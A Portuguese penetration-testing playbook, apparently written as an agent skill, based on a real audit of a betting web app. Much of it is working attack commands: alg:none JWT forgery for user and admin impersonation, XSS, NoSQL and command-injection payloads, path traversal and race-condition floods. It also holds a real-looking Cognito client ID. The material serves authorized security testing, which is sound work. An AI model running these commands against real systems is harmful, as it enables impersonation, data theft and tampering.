---
name: playbook-seguranca-web
description: Playbook de pentest web autorizado: reconhecimento, autenticacao, autorizacao, JWT, IDOR, XSS, injection, CORS, rate limiting e logica de negocio. Use somente ao testar seguranca de um alvo autorizado.
---

# 🛡️ Playbook de Auditoria de Segurança Web

**Autor:** Matheus Ribeiro
**Última atualização:** 11/06/2026
**Uso:** Testar sites internos da Dati e projetos pessoais
**Baseado em:** Auditoria real do Palpite Campeão (Copa 2026)

---

## 📋 Índice

1. [Metodologia Geral](#1-metodologia-geral)
2. [Fase 1: Reconhecimento](#2-fase-1-reconhecimento)
3. [Fase 2: Mapeamento de API](#3-fase-2-mapeamento-de-api)
4. [Fase 3: Testes de Autenticação](#4-fase-3-testes-de-autenticação)
5. [Fase 4: Testes de Autorização](#5-fase-4-testes-de-autorização)
6. [Fase 5: Validação de Input](#6-fase-5-validação-de-input)
7. [Fase 6: Testes de Infraestrutura](#7-fase-6-testes-de-infraestrutura)
8. [Fase 7: Race Conditions](#8-fase-7-race-conditions)
9. [Fase 8: Testes Específicos por Stack](#9-fase-8-testes-específicos-por-stack)
10. [Ferramentas e Recursos](#10-ferramentas-e-recursos)
11. [Referências de Pesquisa](#11-referências-de-pesquisa)

---

## 1. Metodologia Geral

### Fluxo de Auditoria

```
Reconhecimento → Mapeamento → Auth → Authz → Input → Infra → Race → Stack-Specific → Relatório
```

### Regras

- **NUNCA** testar em produção sem autorização do dono
- Documentar TUDO (requests, responses, timestamps)
- Não alterar dados a menos que seja explicitamente necessário para prova de conceito
- Se encontrar algo crítico, reportar IMEDIATAMENTE antes de continuar testando
- Manter tokens e credenciais em variáveis de ambiente (não hardcode em scripts)

### Como funcionou no Palpite Campeão

1. Acessei o site com Playwright → identifiquei Cognito + API Gateway
2. Interceptei requests → mapeei todos os endpoints
3. Testei endpoints sem auth → achei `/matches` público
4. Decodifiquei o JWT → entendi os claims e o issuer
5. Criei JWT com `alg:none` → **FUNCIONOU** (falha crítica)
6. Impersonei outro user → vi palpites alheios
7. Impersonei admin → registrei resultado falso
8. Race condition com curl paralelo → confirmei ausência de locks

---

## 2. Fase 1: Reconhecimento

### Objetivo
Mapear a superfície de ataque: tecnologias, endpoints, providers de auth, domínios.

### 2.1 Identificar Stack pelo Frontend

```bash
# Headers do servidor
curl -sI https://ALVO.com | grep -iE "(server|x-powered-by|x-amz|via|x-vercel|x-netlify)"

# Verificar se é CloudFront
curl -sI https://ALVO.com | grep -i "x-amz\|cloudfront\|x-cache"

# Verificar se é SPA (React/Vue/Angular)
curl -s https://ALVO.com | grep -oP 'src="[^"]*\.(js|chunk)"' | head -5

# Verificar service worker ou manifest (PWA)
curl -s https://ALVO.com/manifest.json 2>/dev/null
curl -s https://ALVO.com/sw.js 2>/dev/null | head -5
```

### 2.2 Identificar Provider de Auth

```bash
# Procurar URLs de auth no HTML/JS
curl -s https://ALVO.com | grep -oP 'https://[^"]*auth[^"]*'
curl -s https://ALVO.com | grep -oP 'https://[^"]*cognito[^"]*'
curl -s https://ALVO.com | grep -oP 'https://[^"]*auth0[^"]*'
curl -s https://ALVO.com | grep -oP 'client_id=[^&"]*'

# No Palpite Campeão encontrei:
# https://palpite-campeao-dev.auth.us-east-1.amazoncognito.com/oauth2/authorize
# ?client_id=5r127rjp37bd6dn917v7dei1q1
# &identity_provider=GoogleWorkspace
```

#### O que extrair do URL de auth:
- **Cognito**: User Pool ID, Client ID, region, identity provider
- **Auth0**: tenant, client_id, connection
- **Firebase**: project ID, API key
- **Keycloak**: realm, client_id

### 2.3 Examinar Headers de Segurança

```bash
curl -sI https://ALVO.com | grep -iE "(x-frame|x-content|strict-transport|content-security|x-xss|referrer-policy|permissions-policy)"
```

**Checklist de headers esperados:**
- [ ] `Strict-Transport-Security` (HSTS)
- [ ] `X-Content-Type-Options: nosniff`
- [ ] `X-Frame-Options: DENY` ou `SAMEORIGIN`
- [ ] `Content-Security-Policy` (CSP)
- [ ] `Referrer-Policy`
- [ ] `Permissions-Policy`
- [ ] `X-XSS-Protection: 0` (deprecado, mas ausência não é falha)

### 2.4 Identificar API Backend

```bash
# Via Playwright (melhor - intercepta requests dinâmicos)
# Ou via source JS:
curl -s https://ALVO.com/static/js/main*.js | grep -oP 'https://[^"]*api[^"]*' | sort -u
curl -s https://ALVO.com/static/js/main*.js | grep -oP 'https://[^"]*execute-api[^"]*' | sort -u
curl -s https://ALVO.com/static/js/main*.js | grep -oP '"/(api|v1|v2)/[^"]*"' | sort -u
```

### 2.5 Via Playwright (método usado na auditoria)

```javascript
// Navegar e capturar todas as requests de API
// 1. Injetar tokens no localStorage
// 2. Navegar por todas as páginas
// 3. Capturar requests via browser_network_requests
// 4. Anotar: método, path, headers, response status
```

**No Palpite Campeão:** Usei Playwright MCP para navegar autenticado e capturei:
- `GET /matches` → 200 (lista jogos)
- `GET /bets/my` → 200 (meus palpites)
- `GET /ranking` → 200 (ranking com emails)

---

## 3. Fase 2: Mapeamento de API

### Objetivo
Descobrir todos os endpoints, métodos aceitos, e estrutura de dados.

### 3.1 Endpoint Discovery

```bash
TOKEN="<token_valido>"
BASE="https://API.execute-api.REGION.amazonaws.com"

# Testar rotas comuns
for path in \
  users users/me profile admin \
  matches bets bets/all ranking score \
  settings config health status \
  docs swagger openapi.json api-docs; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$BASE/$path")
  echo "$path => $code"
done
```

**Interpretação dos status codes:**
- `200` → endpoint existe e retorna dados
- `401` → existe mas requer auth
- `403` → existe mas acesso negado (talvez admin)
- `404` → não existe
- `405` → existe mas método errado (testar outros métodos!)
- `307` → redirect (testar com/sem trailing slash)

### 3.2 Testar Métodos HTTP

```bash
# Quando encontrar 405, testar todos os métodos
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method \
    -H "Authorization: Bearer $TOKEN" "$BASE/matches/ID/result")
  echo "$method => $code"
done
```

**No Palpite Campeão:**
- `GET /matches/{id}/result` → 405
- `PUT /matches/{id}/result` → 403 "Admin access required" ← **achei rota admin!**
- `POST /matches/{id}/result` → 405

### 3.3 Analisar Response Bodies

Coisas para procurar:
- **Campos internos expostos**: PK, SK, _id, __v, createdBy, internalId
- **Emails/PII de outros usuários**: especialmente em listings/rankings
- **Tokens ou secrets**: apiKey, secretKey, connectionString
- **Stack leakage**: nomes de tabela DynamoDB, nomes de bucket S3
- **Error messages verbosas**: stack traces, nomes de arquivos internos

---

## 4. Fase 3: Testes de Autenticação

### Objetivo
Verificar se o sistema valida corretamente a identidade do usuário.

### 4.1 JWT alg:none Attack (O QUE ENCONTRAMOS!)

**Contexto da descoberta:**
Ao decodificar o JWT do Cognito, vi que era RS256. A primeira coisa que testei foi trocar para `alg:none` — se o backend faz apenas `jwt.decode()` sem verificar signature, aceita qualquer coisa.

```bash
# Criar JWT com alg:none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{
  "sub": "qualquer",
  "cognito:username": "GoogleWorkspace_vitima@empresa.com.br",
  "aud": "<CLIENT_ID>",
  "identities": [{"userId": "vitima@empresa.com.br"}],
  "token_use": "id",
  "exp": 9999999999
}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

FAKE="${HEADER}.${PAYLOAD}."

# Testar
curl -s -w "\n%{http_code}" -H "Authorization: Bearer $FAKE" "$BASE/ranking"
# Se retornar 200 → VULNERÁVEL!
# Se retornar 401 → protegido
```

**Por que funcionou no Palpite Campeão:**
O Leo provavelmente usou algo como:
```python
import jwt
claims = jwt.decode(token, options={"verify_signature": False})
# ou
payload = base64.b64decode(token.split('.')[1])
```

Em vez de verificar com a public key do Cognito.

### 4.2 JWT com Signature Adulterada

```bash
# Pegar token válido e trocar 1 char da signature
VALID="eyJhbGci....<payload>.<signature>"
TAMPERED="${VALID%?}X"  # troca último char

curl -s -w "\n%{http_code}" -H "Authorization: Bearer $TAMPERED" "$BASE/ranking"
# Se 200 → backend não valida signature
```

### 4.3 Token Expirado

```bash
# Usar token com exp já passado
curl -s -w "\n%{http_code}" -H "Authorization: Bearer <token_expirado>" "$BASE/ranking"
# Se 200 → backend não valida expiração
```

### 4.4 Decodificar JWT para Extrair Info

```bash
# Decodificar payload de qualquer JWT (sem verificar)
echo "<TOKEN>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Informações úteis:
# - iss (issuer) → qual Cognito/Auth0/etc
# - aud (audience) → client ID
# - sub (subject) → user ID interno
# - cognito:groups → grupos do usuário
# - exp/iat → quando expira
# - identities → email, provider
```

### 4.5 Endpoints sem Auth

```bash
# Testar TODOS os endpoints sem header Authorization
for path in matches bets/my ranking profile; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$path")
  echo "$path (sem auth) => $code"
done
# 200 sem auth = endpoint público (possível falha se deveria ser protegido)
```

### 4.6 Trailing Slash Bypass (API Gateway HTTP API)

```bash
# Bug conhecido em AWS HTTP API (2026) — trailing slash pode bypassar authorizer
curl -s -w "\n%{http_code}" "$BASE/ranking"   # com auth normal → 401 sem token
curl -s -w "\n%{http_code}" "$BASE/ranking/"  # trailing slash → pode retornar 200/307!
curl -s -w "\n%{http_code}" "$BASE//ranking"  # double slash
curl -s -w "\n%{http_code}" "$BASE/./ranking" # dot-path
```

**No Palpite Campeão:** Trailing slash retornou 307 (redirect), não bypass direto, mas indica path normalization diferente.

---

## 5. Fase 4: Testes de Autorização

### Objetivo
Verificar se o sistema controla corretamente O QUE cada usuário pode fazer.

### 5.1 IDOR (Insecure Direct Object Reference)

```bash
# Se a API usa IDs no path, trocar para IDs de outros recursos
curl -H "Authorization: Bearer $TOKEN" "$BASE/bets/meu_id"
curl -H "Authorization: Bearer $TOKEN" "$BASE/bets/outro_id"  # IDOR!

# Se usa email:
curl -H "Authorization: Bearer $TOKEN" "$BASE/bets/meu@email.com"
curl -H "Authorization: Bearer $TOKEN" "$BASE/bets/vitima@email.com"  # IDOR!
```

**No Palpite Campeão:** O endpoint `/bets/my` usa o email DO TOKEN, não do URL — protegido contra IDOR direto. MAS com JWT falso, impersonei qualquer user.

### 5.2 Escalação Horizontal (ver dados de outros)

```bash
# Criar JWT com email de outro user
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"identities":[{"userId":"VITIMA@empresa.com"}],...}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -H "Authorization: Bearer ${HEADER}.${PAYLOAD}." "$BASE/bets/my"
# Se retornar dados da vítima → escalação horizontal
```

### 5.3 Escalação Vertical (virar admin)

```bash
# Testar nomes comuns de grupo admin no JWT
for group in admin admins Admin Admins ADMIN super-admin administrators managers; do
  # Criar JWT com esse grupo
  # Testar endpoint admin
  code=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
    -H "Authorization: Bearer $FAKE_COM_GRUPO" "$BASE/admin/endpoint")
  echo "group=$group => $code"
done

# Se nenhum grupo funcionar, testar por EMAIL (o que aconteceu no Palpite Campeão!)
# Impersonar email do dev/admin
```

**Como descobri que era por email:**
- Tentei todos os nomes de grupo → todos 403
- Criei JWT com email do Leo (criador do app) → 200!
- Conclusão: check é por email hardcoded, não por Cognito Group

### 5.4 Mass Assignment

```bash
# Enviar campos extras no body que não deveriam ser editáveis
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"matchId":"abc","homeScore":1,"awayScore":0,"points":999,"role":"admin","isAdmin":true}' \
  "$BASE/bets"
# Verificar se algum campo extra foi salvo
```

**No Palpite Campeão:** `points` no body foi ignorado (Pydantic model filtra campos extras). Bom!

---

## 6. Fase 5: Validação de Input

### Objetivo
Verificar se o backend valida e sanitiza inputs corretamente.

### 6.1 Limites Numéricos

```bash
# Testar valores extremos
curl -X POST ... -d '{"score": -1}'        # negativo
curl -X POST ... -d '{"score": 0}'         # zero (edge)
curl -X POST ... -d '{"score": 99999}'     # muito alto
curl -X POST ... -d '{"score": 2147483647}' # MAX_INT
curl -X POST ... -d '{"score": 1.5}'       # float quando espera int
curl -X POST ... -d '{"score": "abc"}'     # string quando espera int
curl -X POST ... -d '{"score": null}'      # null
curl -X POST ... -d '{"score": true}'      # boolean
```

**No Palpite Campeão:**
- `-1` → 400 "Scores must be >= 0" ✅
- `99` → 201 Aceito! ❌ (sem max)
- `"abc"` → 422 com Pydantic error

### 6.2 XSS em Campos de Texto

```bash
# Se a API aceita texto (nome, comentário, etc)
curl -X POST ... -d '{"name": "<script>alert(1)</script>"}'
curl -X POST ... -d '{"name": "<img src=x onerror=alert(1)>"}'
curl -X POST ... -d '{"name": "{{7*7}}"}'  # template injection
```

### 6.3 NoSQL Injection (DynamoDB)

```bash
# Se parâmetros são usados em FilterExpression
curl "$BASE/search?q=test) OR attribute_exists(secretField"
curl "$BASE/search?q={\"$gt\": \"\"}"  # MongoDB style
```

### 6.4 Tipos Inesperados

```bash
# Enviar array onde espera string
curl -X POST ... -d '{"matchId": ["grp-bra-mar", "final"]}'
# Enviar objeto onde espera string
curl -X POST ... -d '{"matchId": {"$ne": null}}'
```

---

## 7. Fase 6: Testes de Infraestrutura

### Objetivo
Verificar configurações de segurança da infraestrutura.

### 7.1 CORS (Cross-Origin Resource Sharing)

```bash
# Testar se aceita origin malicioso
echo "=== Origin legítimo ==="
curl -sI -H "Origin: https://FRONTEND.com" "$BASE/endpoint" | grep -i "access-control"

echo "=== Origin malicioso ==="
curl -sI -H "Origin: https://evil.com" "$BASE/endpoint" | grep -i "access-control"

echo "=== Origin null ==="
curl -sI -H "Origin: null" "$BASE/endpoint" | grep -i "access-control"
```

**Vulnerável se:** `access-control-allow-origin` reflete o origin malicioso ou é `*` com `allow-credentials: true`

**No Palpite Campeão:** CORS estava correto — só permitia o domínio do CloudFront. ✅

### 7.2 Rate Limiting

```bash
# Burst test
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} " "$BASE/endpoint"
done
echo ""
# Se nenhum 429 → sem rate limiting
```

### 7.3 Content-Security-Policy

```bash
curl -sI https://ALVO.com | grep -i "content-security-policy"
# Ausente = sem proteção contra XSS inline
```

### 7.4 Information Disclosure em Erros

```bash
# Forçar erros para ver o que o backend revela
curl -X POST ... -d '{}'                          # body vazio
curl -X POST ... -d 'invalid json{'              # JSON malformado
curl -X POST ... -d '{"field": "' + 'A'*10000}'  # overflow
curl "$BASE/path/../../etc/passwd"                # path traversal
curl "$BASE/%00"                                  # null byte
```

---

## 8. Fase 7: Race Conditions

### Objetivo
Verificar se operações sensíveis são atômicas.

### 8.1 Contexto da Descoberta

**Pesquisei por:**
- "betting application race condition vulnerability"
- "TOCTOU serverless API exploit 2025 2026"
- "DynamoDB race condition Lambda concurrent"
- "single-packet attack HTTP/2 PortSwigger"

**Fontes-chave:**
- PortSwigger (Black Hat USA 2023): Single-packet attack para eliminar jitter de rede
- fdzdev/Medium (Apr 2025): TOCTOU em APIs serverless
- HackerOne reports: Double-scoring em plataformas de CTF

### 8.2 Teste Básico com curl Paralelo

```bash
# Enviar N requests simultâneos
for i in $(seq 1 20); do
  curl -s -o /tmp/race_$i.txt -w "%{http_code}" -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"matchId\":\"abc\",\"homeScore\":$i,\"awayScore\":0}" \
    "$BASE/bets" &
done
wait

# Verificar resultados
for i in $(seq 1 20); do echo -n "Request $i: "; cat /tmp/race_$i.txt; echo ""; done
```

**No Palpite Campeão:**
- 10 requests simultâneos: 8 aceitos (201) + 2 falharam (503 cold start)
- Sem lock, sem ConditionExpression, last-write-wins

### 8.3 Race no Deadline (TOCTOU)

```bash
# Preparar requests para enviar no momento exato do deadline
# Usar GNU parallel ou curl --parallel (HTTP/2):
curl --http2 --parallel --parallel-immediate --parallel-max 30 \
  -X POST "$BASE/bets" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"matchId":"<jogo_no_deadline>","homeScore":1,"awayScore":0}' \
  -X POST "$BASE/bets" ... [repetir 30x]
```

### 8.4 Double-Spending / Double-Scoring

```bash
# Se há operação de "resgatar pontos" ou "usar cupom":
seq 50 | xargs -P 50 -I {} curl -s -X POST "$BASE/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"CUPOM_UNICO"}'
# Se múltiplos retornam 200 → double-spending
```

### 8.5 Script Python para Race Conditions

```python
import requests
import threading
from collections import Counter

url = "https://API/endpoint"
headers = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
results = []

def send(i):
    r = requests.post(url, json={"score": i}, headers=headers)
    results.append(r.status_code)

threads = [threading.Thread(target=send, args=(i,)) for i in range(50)]
for t in threads: t.start()
for t in threads: t.join()

print(Counter(results))
# {201: 45, 503: 5} → sem proteção
# {201: 1, 409: 49} → protegido (conflict)
```

---

## 9. Fase 8: Testes Específicos por Stack

### 9.1 AWS Cognito

**Pesquisei por:**
- "AWS Cognito JWT bypass 2025 2026"
- "Cognito misconfiguration exploit"
- "Cognito self-signup bypass"
- "CVE-2026-6911 AWS JWT bypass"

**Testes:**

```bash
# 1. Verificar se self-signup está habilitado
curl -X POST "https://cognito-idp.REGION.amazonaws.com/" \
  -H "Content-Type: application/x-amz-json-1.1" \
  -H "X-Amz-Target: AWSCognitoIdentityProviderService.SignUp" \
  -d '{"ClientId":"CLIENT_ID","Username":"test@evil.com","Password":"Test1234!"}'
# Se não retornar erro de "signup disabled" → qualquer pessoa pode criar conta!

# 2. Verificar JWKS endpoint (public keys do Cognito)
curl "https://cognito-idp.REGION.amazonaws.com/USER_POOL_ID/.well-known/jwks.json"
# Isso é público e normal — serve para verificar JWTs

# 3. Listar identity providers configurados
# (via URL de login do Cognito Hosted UI)

# 4. Testar se aceita tokens de outro User Pool
# Criar JWT com ISS diferente e ver se aceita
```

### 9.2 AWS API Gateway

**Pesquisei por:**
- "API Gateway bypass authorizer trailing slash 2026"
- "API Gateway caching vulnerability"
- "HTTP API vs REST API security differences"

**Testes:**

```bash
# 1. Trailing slash bypass (HTTP API + Lambda Authorizer)
curl "$BASE/protected"   # 401
curl "$BASE/protected/"  # 200? → bypass!

# 2. Method override
curl -X GET "$BASE/admin" -H "X-HTTP-Method-Override: PUT"

# 3. API Gateway sem authorizer em stage específico
curl "https://API.execute-api.REGION.amazonaws.com/dev/endpoint"
curl "https://API.execute-api.REGION.amazonaws.com/prod/endpoint"
# Às vezes dev tem auth diferente de prod

# 4. Verificar se é REST API ou HTTP API
# REST API: retorna XML em erros, tem "x-amzn-RequestId"
# HTTP API: retorna JSON, mais enxuto
```

### 9.3 AWS DynamoDB (via API)

**Pesquisei por:**
- "DynamoDB injection attack 2025"
- "CVE-2026-25814 DynamoDB"
- "DynamoDB ConditionExpression bypass"

**Testes:**

```bash
# 1. Injeção em FilterExpression (se API aceita filtros)
curl "$BASE/search?filter=name&value=test) OR attribute_exists(password"

# 2. ProjectionExpression manipulation
curl "$BASE/users/123?fields=name,email,password,api_key"

# 3. Verificar se responses expõem PK/SK (design do banco)
curl "$BASE/items" | grep -o '"PK"\|"SK"\|"GSI"'
```

### 9.4 AWS Lambda

**Pesquisei por:**
- "Lambda event injection 2025"
- "Lambda credential theft environment variables"
- "jsmon.sh Lambda injection April 2026"

**Testes:**

```bash
# 1. Command injection (se Lambda processa input em shell commands)
curl -X POST "$BASE/process" -d '{"filename": "test; env | base64"}'

# 2. Verificar error stack traces que revelam paths internos
curl -X POST "$BASE/endpoint" -d '{"trigger_error": true}'
# Procurar: /var/task/, /opt/python/, handler.py, etc

# 3. Timeout abuse (Lambda tem max 15min)
# Enviar request que causa processamento longo
```

### 9.5 Sites com Next.js / Vercel

```bash
# 1. Verificar se API routes estão protegidas
curl https://ALVO.com/api/users
curl https://ALVO.com/api/admin

# 2. _next/data endpoint (pode vazar dados de SSR)
curl "https://ALVO.com/_next/data/BUILD_ID/protected-page.json"

# 3. Source maps expostos
curl "https://ALVO.com/_next/static/chunks/main.js.map"
```

### 9.6 Sites com Firebase

```bash
# 1. Verificar Firestore rules (se permitem read público)
curl "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/COLLECTION"

# 2. Firebase Storage público
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT_ID.appspot.com/o?prefix=uploads/"

# 3. Firebase Auth - verificar se permite signup
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
  -d '{"email":"test@test.com","password":"123456","returnSecureToken":true}'
```

---

## 10. Ferramentas e Recursos

### Ferramentas Usadas na Auditoria

| Ferramenta | Uso |
|---|---|
| **Playwright MCP** | Navegar autenticado, interceptar requests, capturar snapshots |
| **curl** | Testar endpoints manualmente, enviar payloads |
| **base64** | Criar/decodificar JWTs |
| **python3** | Parsear JSON responses, scripts de race condition |
| **GNU parallel** | Race condition testing (requests simultâneos) |

### Ferramentas Recomendadas (não usadas mas úteis)

| Ferramenta | Uso |
|---|---|
| **Burp Suite** | Proxy interceptador, repeater, intruder (race conditions) |
| **OWASP ZAP** | Scanner automatizado gratuito |
| **ffuf** | Fuzzing de endpoints e parâmetros |
| **jwt.io** | Decodificar JWTs visualmente |
| **Turbo Intruder** | Single-packet attack para race conditions |
| **httpx** | Probing de múltiplos endpoints em paralelo |
| **nuclei** | Scanner de vulnerabilidades com templates |

### Sites para Pesquisa

| Recurso | URL | Uso |
|---|---|---|
| **PortSwigger Research** | portswigger.net/research | Técnicas avançadas (race conditions, JWT) |
| **HackerOne Hacktivity** | hackerone.com/hacktivity | Relatórios reais de bugs |
| **OWASP Testing Guide** | owasp.org/www-project-web-security-testing-guide | Checklist completo |
| **CWE Database** | cwe.mitre.org | Classificação de vulnerabilidades |
| **PayloadsAllTheThings** | github.com/swisskyrepo/PayloadsAllTheThings | Payloads prontos |
| **JWT Attacks** | portswigger.net/web-security/jwt | Guia completo de ataques JWT |
| **AWS Security Blog** | aws.amazon.com/blogs/security | Advisories da AWS |

---

## 11. Referências de Pesquisa

### Queries que Usei (e que funcionaram!)

```
"AWS Cognito JWT bypass 2025 2026"
"Cognito privilege escalation"
"API Gateway bypass authorizer trailing slash 2026"
"DynamoDB injection attack 2025"
"CVE-2026-25814 DynamoDB NoSQL injection"
"serverless race condition exploit"
"TOCTOU betting API exploit 2025 2026"
"betting application race condition vulnerability"
"sports prediction app security bypass deadline"
"single-packet attack HTTP/2 PortSwigger"
"Lambda event injection vulnerability 2026"
"JWT alg none attack bypass"
"API Gateway caching vulnerability authorizer"
"DynamoDB ConditionExpression race condition"
"Mass assignment API vulnerability 2025"
"IDOR API endpoint exploit"
```

### Artigos e CVEs Relevantes

| Referência | Relevância |
|---|---|
| CVE-2026-25814 (PlaciPy) | DynamoDB injection, CVSS 9.3 |
| CVE-2026-6911 (AWS Ops Wheel) | JWT bypass em app AWS |
| PortSwigger "Smashing the state machine" (2023) | Single-packet race attacks |
| Piyush Gupta — API Gateway trailing slash ($12k bounty) | Auth bypass via path normalization |
| jsmon.sh — Lambda Event Injection (Apr 2026) | RCE via event manipulation |
| Authress — API GW Authorizer Caching (May 2025) | Cache poisoning para privilege escalation |
| fdzdev/Medium — TOCTOU em serverless (Apr 2025) | Race conditions em Lambda |
| Strobes Security — HPP/Mass Assignment (Mar 2025) | Parameter pollution em APIs |

### Fontes de Conhecimento que Alimentaram a Auditoria

1. **Conhecimento prévio de AWS** (trabalhando na Dati com Cognito, API Gateway, Lambda, DynamoDB)
2. **Experiência com JWT** (saber que tokens têm header.payload.signature e que `alg:none` é um ataque clássico)
3. **Mapeamento visual com Playwright** (ver a estrutura do site autenticado sem depender de documentação)
4. **Análise do response** (notar PK/SK no JSON = DynamoDB single-table design → entender o modelo de dados)
5. **Subagentes de pesquisa** (3 pesquisas paralelas: Cognito attacks, API GW+DynamoDB attacks, betting app attacks)

---

## 📝 Template de Relatório

```markdown
# Relatório de Auditoria — [NOME DO SITE]

**Data:** DD/MM/YYYY
**Auditor:** [Seu nome]
**Alvo:** [URL]
**Autorizado por:** [Nome do responsável]

## Stack Identificada
- Frontend: 
- Backend: 
- Auth: 
- Banco: 
- CDN: 

## Endpoints Mapeados
| Método | Path | Auth | Descrição |
|---|---|---|---|

## Vulnerabilidades

### [#N] [Nome da Vulnerabilidade]
- **Severidade:** 🔴/🟡/⚪
- **CWE:** CWE-XXX
- **OWASP:** AXX:2021
- **Descrição:** 
- **PoC:** [comando curl]
- **Impacto:** 
- **Correção:** 

## O que foi Alterado
| Ação | Antes | Depois | Reversível? |

## Testes de Verificação Pós-Correção
1. [teste]
2. [teste]
```

---

## ⚡ Quick Reference — Comandos Mais Usados

```bash
# === DECODIFICAR JWT ===
echo "TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# === CRIAR JWT ALG:NONE ===
H=$(echo -n '{"alg":"none"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(echo -n '{"sub":"x","email":"victim@co.com","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "${H}.${P}."

# === TESTAR ENDPOINT SEM AUTH ===
curl -s -o /dev/null -w "%{http_code}" https://API/path

# === TESTAR CORS ===
curl -sI -H "Origin: https://evil.com" https://API/path | grep access-control

# === RACE CONDITION (10 paralelos) ===
for i in $(seq 1 10); do curl -s -X POST ... & done; wait

# === RATE LIMIT CHECK ===
for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " URL; done

# === HEADERS DE SEGURANÇA ===
curl -sI https://SITE | grep -iE "(x-frame|csp|hsts|x-content|referrer)"
```

---

*Este playbook é um documento vivo. Atualizar após cada nova auditoria com técnicas e descobertas novas.*
